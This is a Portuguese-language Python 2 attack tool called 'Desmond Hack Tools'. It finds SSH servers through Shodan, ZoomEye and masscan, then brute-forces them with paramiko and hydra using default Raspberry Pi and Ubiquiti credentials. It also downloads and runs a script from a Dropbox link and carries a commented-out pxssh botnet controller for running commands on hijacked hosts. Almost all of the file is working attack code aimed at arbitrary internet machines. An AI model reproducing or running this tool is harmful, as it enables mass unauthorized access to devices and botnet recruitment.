#!/bin/usr/python
# -*- coding: utf-8 -*-

from zoomeye import zoomeye
import socket
from bs4 import BeautifulSoup
import os
import paramiko
import time
import argparse
import pxssh
import sys
import shodan
#import twilio
import urllib2
import urlparse
import whois
#import mechanize

#estou aqui te observando e hackeando sua conexao '-'

#cores do script
roxo = "\033[1;35m"
vermelho = "\033[31;1m"
azul = "\033[34m"
azul_claro = "\033[1;36m"
verde = "\033[32;1m"
branco = "\033[1;37m"
#banner e animaçoes , creditos
banner_DTH = """
              
 _(`-')    (`-')  _ (`-').-><-. (`-')             <-. (`-')_  _(`-')        (`-').->(`-')      
( (OO ).-> ( OO).-/ ( OO)_     \(OO )_      .->      \( OO) )( (OO ).->     (OO )__ ( OO).->   
 \    .'_ (,------.(_)--\_) ,--./  ,-.)(`-')----. ,--./ ,--/  \    .'_     ,--. ,'-'/    '._   
 '`'-..__) |  .---'/    _ / |   `.'   |( OO).-.  '|   \ |  |  '`'-..__)    |  | |  ||'--...__) 
 |  |  ' |(|  '--. \_..`--. |  |'.'|  |( _) | |  ||  . '|  |) |  |  ' |    |  `-'  |`--.  .--' 
 |  |  / : |  .--' .-._)   \|  |   |  | \|  |)|  ||  |\    |  |  |  / :    |  .-.  |   |  |    
 |  '-'  / |  `---.\       /|  |   |  |  '  '-'  '|  | \   |  |  '-'  /    |  | |     |,-.|  |    
 `------'  `------' `-----' `--'   `--'   `-----' `--'  `--'  `------'     `--' `--''-'`--' 
                              
                              +===============================================================+
                              |                ☠ DESMOND HACK TOLLS ☠ SI 0.0.1                |
                              +================================================================
                              |*[1]botnet *[2]serves_chave *[3]analise(ip/host) *[4]crawler   |
                              |    [+] contact telegram: @Desmondelite  {#wendel} [+]         |
                              |  ***I am not responsible, for the way of use of third parties |
                              |                     CRAKING AND CRIME!***                     |
                              +===============================================================+
                              |        Sair[Ctrl + C], BN[1],  BC[2], AN[3], WC[4]            |
                              *****************************************************************
"""

banner_final = """

¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶¶¶¢¢¶¢¢¶¶¶¶´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶´¢¢¢¢¢¢¶´´´´´´´´´´¶¢¢¢¢¢¢¢¢¢¶´´´´´¶¶¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶´´¢¢¢¢¢¶´´¶¶¶¶¶¶´´´´¢¢¢¢¢´´´´´´´´´´´´¢¢¢¢¢´´¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶´´´¢¢¢¢¢´´¶¶¶¶¶¶¶´´¶¢¢¢¢¢´´´´¶¶¶¶¶¶´´¢¢¢¢´´´¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶´´´¢¢¢¢´´´´´´´´´´¢¢¢¶´¢¢¢¶´´´´´´´´´´¢¢¢´´´¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶´´´¢¢¢¢¢¢¢¢¶¶¶¢¢¢¢¶´´´¢¢¢¢¶´´´´´¢¢¢¢¢¢´´¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´´´´´¢¢¢¢¢¢¢¢¢¢¢¢¢¶´¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´¢´´´´¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´¢¢¶´¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´¶¢´´¢¢¢¢´¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¢´´´¶¢¢´¢¢¢¢¢¢¢¢¢¢¶´´´¢¢´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¢¢´´´´´´¢´¶¢¢¶¢¶´¢¶´´¶¢¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶´´´´´´¶¶¶¶¶¶´´¢¢´¢´¢´´´´´´´´´´´´´¶¢¢¢´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶´´¶¶´´´´¶¶¶¶´´¢¢¶¢´¢¢¢¢¶´¢¢´¢¢¢¢¶´¢¢¢´´¶¶¶¶´´´´´´¶¶¶¶¶¶¶
¶¶¶¶´¢¢¢¢¢¶´´´¶¶´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´¶¶¶´´´´´´´´¶¶¶¶¶¶
¶¶¶´´¢¢¢¢¢¢¢´´´´¶´´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´¶¶¶´´¢¢¢¢¶´´´´¶¶¶
¶¶´´¢¢¢¢¢¢¢¢¢¶´´´´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´´¶´´´´¶¢¢¢¢¢¶´´´´¶¶
¶¶´¶¢¢¢¢¢¢¢¢¢¢¢¢¶´´´´´´´´¶¢¢¢¢¢¢¢¢¶´´´´´´´´´´¶¢¢¢¢¢¢¢¢¢¢¢´¶¶
¶¶´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´´´´´´´´´´´´´´´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´¶¶
¶¶´´´¶¶¶¶´´´´´¶¢¢¢¢¢¢¢¢¶´´´´´´´´´´´´´¶¢¢¢¢¢¢¢¢¢¢¶´¶¢¢¢¢¢´´¶¶
¶¶¶´´´´´´´´´´´´´´´¶¢¢¢¢¢¢¢¢´´´´´´¶¢¢¢¢¢¢¢¢¢¢¶´´´´´´´´´´´´´¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´¢¢¢¢¢¢¢¢¢¢¢¶´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢¢¢¶´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´¶¢¢¢¢¢¢¢¢¢¢¶´¶¢¢¢¢¢¢¢¢¢¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶´´´´´´´¶¢¢¢¢¢¢¢¢¢¶´´´´´´´´´´¶¢¢¢¢¢¢¢¢¢´´´´´´´´´´´´¶¶¶
¶´´´´´´´´´¶¢¢¢¢¢¢¢¢¢¶´´´´´´¶¶¶¶¶¶´´´´´´¶¢¢¢¢¢¢¢¢¶´´´´´´´´´´¶
´´´´¶¢¢¢¢¢¢¢¢¢¢¢´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´¢¢¢¢¢¢¢¢¢¢¢¢¢¢´´¶
¶¢¢¢¢¢¢¢¢¢¢¢´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¢¢¢¢¢¢¢¢¢¢¢¢´¶
¶¢¢¢¢¢¢¢¢´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´¢¢¢¢¢¢¢´´´¶
´´¢¢¢¢¢¢¶´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¢¢¢¢¢¢¢´´¶¶
´´´¶¢¢¢´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¢¢¢¶´´¶¶¶



  ▄████  ▒█████   ▒█████  ▓█████▄  ▄▄▄▄    ▄▄▄     ▓██   ██▓    ██░ ██  ▄▄▄     ▄▄▄█████▓ ▐██▌ 
 ██▒ ▀█▒▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█████▄ ▒████▄    ▒██  ██▒   ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒ ▐██▌ 
▒██░▄▄▄░▒██░  ██▒▒██░  ██▒░██   █▌▒██▒ ▄██▒██  ▀█▄   ▒██ ██░   ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░ ▐██▌ 
░▓█  ██▓▒██   ██░▒██   ██░░▓█▄   ▌▒██░█▀  ░██▄▄▄▄██  ░ ▐██▓░   ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░  ▓██▒ 
░▒▓███▀▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▓█  ▀█▓ ▓█   ▓██▒ ░ ██▒▓░   ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░  ▒▄▄  
 ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░▒▓███▀▒ ▒▒   ▓▒█░  ██▒▒▒     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░    ░▀▀▒ 
  ░   ░   ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ▒░▒   ░   ▒   ▒▒ ░▓██ ░▒░     ▒ ░▒░ ░  ▒   ▒▒ ░   ░     ░  ░ 
░ ░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ░    ░   ░   ▒   ▒ ▒ ░░      ░  ░░ ░  ░   ▒    ░          ░ 
      ░     ░ ░      ░ ░     ░     ░            ░  ░░ ░         ░  ░  ░      ░  ░         ░    
                           ░            ░           ░ ░                                        

"""
#funcoes de funcionamento iniciais
global port_sb
def brute_ssh(vitima, usuario, porta, wordlist):
    try:
        file=open(wordlist, "r")
        for pwd in file:
            pwd=pwd[:-1]
            #vitima = str()
            #pwd = str()
            #porta = int()
            c = "SENHA: "+ str(pwd) + " PORT:" + str(porta)
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(vitima, porta, usuario, pwd)
                print(verde+"\n[HOST]:\t"+"\t"+vitima+"\t"+" \tSENHA ENCONTRADA : "+"\t"+c)
                print """ +========================================================+
                          | [+] SERVER SSH VULNERAVEL ENCONTRADO: %s               |
                          +--------------------------------------------------------+
                          """%pwd

                break;
            except paramiko.AuthenticationException:
                print(vermelho+"\n[HOST]:\t"+ "\t"+vitima+"\t"+" \tTENTANDO BRUTE FORCE : "+"\t"+c)
                ssh.close()
            except socket.error:
            	print ""
                print(vermelho+"[-] ERRO  NA CONEXAO COM: (socket.error): %s"%vitima)
                break;

        ssh.close()
    except IOError:
        print("[-] ERRO WORDLIST NAO ENCONTRADA: %s"%wordlist)

def main():
    lista_de_ips = "scan.txt"
    arq = open(lista_de_ips, "r") 

    #porta = input("coloque aqui o port: [22] ou [2222] ")

    usu = raw_input("coloque aqui o file user que deseja fazer o ataque: padrao[user.txt]: ")
    
    fileu = open(usu, "r")

    word = raw_input("coloque aqui o caminho da wordlist: padrao[pass.txt] ")

    for userz in fileu.readlines():
        global userz


    if arq and word:
        for ip in arq.readlines():
            brute_ssh(ip, userz, port_sb, word)
            
                
            #for userz in fileu:
                
               # brute_ssh(ip, userz, porta, word)
    else:
        print("error")

#aaaaaa
#thuthtuh		
os.system('clear')
print roxo + banner_DTH
time.sleep(3.3)
#funçao argumentos
parser = argparse.ArgumentParser(description="instalaçao reqs pip")

parser.add_argument("--install", action="store", dest="install", required=False, help="use aptitude ou pip")

argume = parser.parse_args()

if argume.install == "apt-get":
	print '[+]***********************************iniciando instalaçoes das dependencias aptitude: '
	os.system('apt-get update')
	os.system(argume.install +' install build-essential libssl-dev libffi-dev python-dev')
elif argume.install == "pip":
	print '[+]***********************************iniciando instalaçoes das dependencias pip: '
	os.system(argume.install + ' install -U cffi')
	os.system(argume.install + ' install --upgrade setupext-pip')
	os.system(argume.install + ' install -U cryptography')
	os.system(argume.install + ' install paramiko')
	os.system('apt-get install git')
	os.system('git clone https://github.com/s0m30ne/zoomeye.git')
	os.system('cd zoomeye/')
	os.system('python setup.py install')
	os.system('easy_install shodan')
	os.system('easy_install -U shodan')

#funçao de escolha
try:
	print '[Digite (sair) para SAIR ]'
	print '[+] em caso de certos erros verifique se instalou as req usando os comandos abaixo:'
	print '[+] "python Des_ht.py --install apt-get" && "python Des_ht.py --install pip [+ na ordem +]"'
	print ''
	print """
	     +------------------------------------------------------------------------+
             | >>>programador: wendel telegram: @desmondelite Version: 0.0.1          |
             +------------------------------------------------------------------------+
             | [+] Esse scritp conta com um sistema de busca de chaves que trabalha   +
             | diretamente com o bruteforce ssh nos servers [+] [2]                   |
             |------------------------------------------------------------------------|
             + [-] funçao botnet desativada  [+] [1]                                  +
             |------------------------------------------------------------------------|
             | [+] ferramenta de analise: conta com busca de ports e serviços [+] [3] |
             |------------------------------------------------------------------------|
             + [+] ferramenta webcrawler [+] 4,                                       +
             |------------------------------------------------------------------------|
             | ferramentas bonus: **********next versions*********************        |
             ==========================================================================    
"""
	esco = raw_input(verde + ' Desmond.HT $$$ escolha uma opçao >>>>>> '+branco)
except KeyboardInterrupt:
	print(vermelho+'\n \n [-] SAINDO....................................[*]')
	time.sleep(2)
	print banner_final

print ""
#fs masscan
def masscan_scan():
	global scan_host, scan_pra
	scan_host = raw_input('coloque aqui o range que deseja escanear>>>> [ex: 0.0.0.0-1.1.1.1]')
	print 'azul + \n \n ****PESQUISANDO******'
	scan_pra = os.system('masscan -p 22 ' + scan_host + ' >scan.txt')
	print 'o scan terminou!'

#variaveis soltas 
sc = masscan_scan
#varios ifs elifs
try:
	if esco == "1":
		end_host = int(raw_input('[+] coloque aqui o host que deseja conectar: '))
		end_user = str(raw_input('[+] coloque aqui o user que vai ultilizar: '))
		end_pass = str(raw_input('[+] coloque a pass do bot: '))
		botNet = []
		addClient(end_host, end_user, end_pass)
		botnetCommand('sudo su')
		botnetCommand('mkdir filho_da_puta')
	elif esco == "2":
		#entrar informaçoes para invasao de hosts vulneraveis so shodan
		api_key = raw_input(verde+'[+] entre aqui com sua api key do shodan: '+vermelho)
		try:
			api = shodan.Shodan(api_key)
			global write_pesq
			write_pesq = open('des_ht_scan.txt', 'w')
			achar_chave = raw_input(verde+'[+] coloque aqui a chave que deseja fazer o scan e o brute force: [+] \n[+] opcionais [R1], [R2], [R3], [V1] [*] \n[+] exemplo: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3 [-] :  '+vermelho)
			result_s = api.search(achar_chave)

			for chave in result_s['matches']:
				ips = chave['ip_str']
				isp_s = chave['isp']
				port_sh = chave['port']
				#asn = chave['asn']
				#coutry_s = chave['country_name']
				timestamp = chave['timestamp']
				#coutry_code = chave['country_code3']
				print '[+] maquina [+] '
				print ''
				print 'IP: %s' %ips
				print 'ISP: %s' %isp_s
				print 'PORT: %s' %port_sh
				#print 'ASN: %s' %asn
				print 'TIMESTAMP: %s' %timestamp
				print ''
				#print 'CIDADE: %s' %coutry_s
				#print 'CIDADE COD: %s' %coutry_code
		  		#parte para gravar ips no 'scan.txt'
				#print(ips)
				write_pesq.write(str(ips) + '\n')
				
			#continuar para o brute force dos ips opçao
			cont_brute = raw_input(verde+'[+] deseja continuar para o brute force do scan realizado ? : (S) (N) '+vermelho)
			if cont_brute.lower() == 's':
				global tem_cert
				print verde+'[+] instalando/atualizando/iniciando definindo credenciais Desmond ssh_bruteforce......: '
				#os.system('apt-get install hydra')
				des_users = open('des_ht_user.txt', 'w')
				text_users = []
				text_users.append('pi\n')
				text_users.append('ubnt\n')
				text_users.append('root\n')
				des_users.writelines(text_users)

				des_pass = open('pass.txt', 'w')
				text_pass = []
				text_pass.append('raspberry\n')
				text_pass.append('ubnt\n')
				text_pass.append('root\n')
				des_pass.writelines(text_pass)
				#escreva aqui seus users e senhas para o brute force


				os.system('mv des_ht_scan.txt scan.txt')
				os.system('mv des_ht_user.txt user.txt')
				time.sleep(2.3)
				print '[+] iniciando bruteforce......................'
				tem_cert = raw_input(vermelho+'[+] CERTEZA QUE DESEJA CONTINUAR COM O BRUTEFORCE: ?: (S) (N) '+branco)


			if tem_cert.lower() == 's':
				#saspraga presiso fechar aqui por n execultar a merda do hydra
				write_pesq.close()
				des_users.close()
				des_pass.close()
				print '[+] iniciando..............'
				global port_sb
				port_sb = input(verde+'[+] coloque aqui o port do ssh que deseja fazer o bruteforce\n[+] port[2222] port[22] : '+vermelho)
				#bt p
				#começar aqui o brute com paramiko
				banp = """ 

    ____                                      __   __________ __  __     ____ 
   / __ \___  _________ ___  ____  ____  ____/ /  / ___/ ___// / / /    / __ )
  / / / / _ \/ ___/ __ `__ \/ __ \/ __ \/ __  /   \__ \\__ \/ /_/ /    / __  |
 / /_/ /  __(__  ) / / / / / /_/ / / / / /_/ /   ___/ /__/ / __  /    / /_/ / 
/_____/\___/____/_/ /_/ /_/\____/_/ /_/\__,_/   /____/____/_/ /_/____/_____/  
                                                               /_____/        

             +===============================+
             + [*] iniciando brute force [*] +
             =================================
             | [*] D3s_M1 brute -v 0.0.1     |
             +-------------------------------+
             + [*] @desmondelite             +
             =================================

"""
				print(vermelho+banp)
				time.sleep(3)
				appp = str(raw_input("[+] Deseja continuar com hydra ou D3s_M1? : 'H' ou 'D' [+] "+verde))
				#if appp.lower() == 's':
				
				if appp.lower() == "d":
					print('[*] iniciando D3s_M1........')
					time.sleep(2)
					if __name__=='__main__':
						main()	
				elif appp.lower() == "h":
					print("[*] iniciando hydra............... ")
					os.system('apt-get install hydra')
					os.system('hydra -L user.txt -P pass.txt -M scan.txt -o suce.txt -s '+ str(port_sb) +' ssh')
					print "[+] results hydra [+] "
					os.system('cat suce.txt')
				else:
					print ""
					print "[-] erro na escolha"			

				time.sleep(2)
				#os.remove('pass.txt')
				#os.remove('scan.txt')
				#print ' [+] resultados [+] '
				#os.system('cat suce.txt')

		except Exception as erru:
		 		print '[-] Erro %s' % erru
		except KeyboardInterrupt:
		 		print vermelho+'[+] operaçao invalida'
		 		print '[+] SAINDO......................'
		 		print azul_claro+banner_final

		print ""
	elif esco.lower() == "sair":
		print vermelho+'\n \n [*] SAINDO....................................[*]'
		time.sleep(2)
		print banner_final
	elif esco == "3":
		global zomm, seu_email, sua_senha, brute_spray_z
		seu_email = raw_input(branco+'[+] coloque aqui seu email do zoomeye: '+azul)
		sua_senha = raw_input(branco+'[+] coloque aqui a sua senha zoomeye: '+azul)
		zomm = zoomeye.Zoomeye(seu_email, sua_senha)

		chave_z = raw_input(branco+'[+] coloque aqui a sua chave de pesquisa: ou ip para analise: '+azul)
		global facets
		facets = "os,device,service"
		zomm.search(chave_z, facets)
		while not zomm.queue.empty():
			resultz = zomm.queue.get()
			
			print azul_claro+'[+] IP DA MAQUINA: %s ' %resultz['ip']
			print verde+'[+] SISTEMA OPERACIONAL: %s' %resultz['os']
			print vermelho+'[+] DISPOSITIVO: %s'  %resultz['device']
			print branco+'[+] RODANDO: %s'  %resultz['service']
			#api zoomeye para uma consulta melhor
		global brute_spray_z	
		brute_spray_z = raw_input(branco+'[+] deseja salvar resultados? >>> : (S) (N) '+azul_claro)
		if brute_spray_z.lower() == 's'	:
			for resultzs in resultz:
			   global arqsz	
			   arqsz = open('scanz.txt', 'w')
			   ipsz = resultz['ip']
			   arqsz.writelines(str(ipsz) + '\n')
			   arqsz.close()
			   #escrever o scan de ips do zoomeye igual o do shodan '-'
			   #merda dessa parte n saiu como eu queria '-'

			os.system('pip install argcomplete')
			os.system('apt-get install git')
			z_brute_user = open('user.txt', 'w')
			z_brute_pass = open('pass.txt', 'w')
			z_user_text = []
			z_user_text.append('pi\n')
			z_user_text.append('ubnt\n')
			z_user_text.append('root\n')
			z_pass_text = []
			z_pass_text.append('raspberry\n')
			z_pass_text.append('ubnt\n')
			z_pass_text.append('root\n')
			z_brute_user.writelines(z_user_text)
			z_brute_pass.writelines(z_pass_text)
			global contz_brute, portzo
			contz_brute = raw_input(vermelho+'[+] continuar com bruteforce ? ´hydra´ : (S), (N)  '+branco)
			portzo = raw_input(verde+'[+] coloque aqui a port [22], [2222]: '+azul_claro)
		if contz_brute.lower() == 's':
			print vermelho+'\ [+] iniciando \ "hydra" '
			os.system('apt-get install nmap')
			z_brute_user.close()
			z_brute_pass.close()
			#arqsz.close()
			#fechar possiveis erros

			os.system('hydra -L user.txt -P pass.txt -M scanz.txt -o suce.txt -s '+portzo+' ssh')
			print azul_claro+'[+] Resultado bruteforce hydra: '
			os.system('cat suce.txt')
			time.sleep(2)
			global term_z
			term_z = raw_input(vermelho+'[+] o brute foce terminou [+] deseja continuar a analise? : ´brutespray.py´ (s) (n): '+branco)
			time.sleep(2)
			if term_z.lower() == 's':
			 	print vermelho+'\ [+] iniciando script................'
			 	os.system('git clone https://github.com/x90skysn3k/brutespray.git')
			 	per_ana = raw_input(branco+'[+] selecione o host especifico para analise de rede:\n [+] Exemplo: 10.1.1.0/24: '+azul)
			 	os.system('apt-get install knot-host knot-dnsutils')
			 	os.system('apt-get install medusa')
			 	os.system('nmap -sS -sV '+per_ana+' -vv -n -oA des.ana')
			 	os.system('cd brutespray')
			 	os.system('rm brutespray.py')
			 	os.system('wget https://www.dropbox.com/s/k3uum4vne0a53ya/brutespray.py')
			 	os.system('python brutespray.py --file de.ana.gnmap -t 5 -T 2')
			 	print '[+] Des_Brutespray\ terminou :'
			 	os.system('cd output')
			 	os.system('ls')
			 	print '[-] resultado'
	elif esco == "4":
		global site
		global visitados
		global sopa
		global urlss
		global textohtml

		site = raw_input('[+] coloque sua url aqui: ex: http://www.muchaos.net.br/shop/promo.php: ')

		urlss = [site]
		visitados = [site]

		while len(urlss) > 0:
			try:
				textohtml = urllib2.urlopen(urlss[0]).read()
			except:
				print urlss[0]

			sopa = BeautifulSoup(textohtml, 'html.parser')
			
			urlss.pop(0)

			print '[+] checando url numero: ', len(urlss), '[+] do site: ', site

			for tag in sopa.findAll('a', href=True):
				tag['href'] = urlparse.urljoin(site, tag['href'])

				if site in tag['href'] and tag['href'] not in visitados:
					urlss.append(tag['href'])
					visitados.append(tag['href'])
		for site in visitados:
		        b = whois.whois(site)
		        print b            
		print visitados			
	else:
		print 'error'
except NameError:
	print '[+]***********************************D.H.T********************************************'
except KeyboardInterrupt:
	print '\n[-] erro codigo interrompido ............ \n'+azul+banner_final

#maldito crawler funcao			

#chama bot net
def ssh_brute_attck():
	global hosts, usu, passwd
	hosts = raw_input('coloque aqui o primeiro host que deseja conectar o botnet: >>>>')
	usu = raw_input('coloque o user para conectar os serves do bot:')
	passwd = raw_input('passwd>>>>>>')
#funçao botnet
"""class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error com o serverao conectar '

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output 


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)"""
#funçao pesquisa de chaves e chama funçao brutedorce 

global R1, R2, R3, V1

R1 = 'SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u1'
R2 = 'SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u2'
R3 = 'SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3'
v1 = 'SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3'

#funçao analise de ip(host)

#funçao busca de informaçao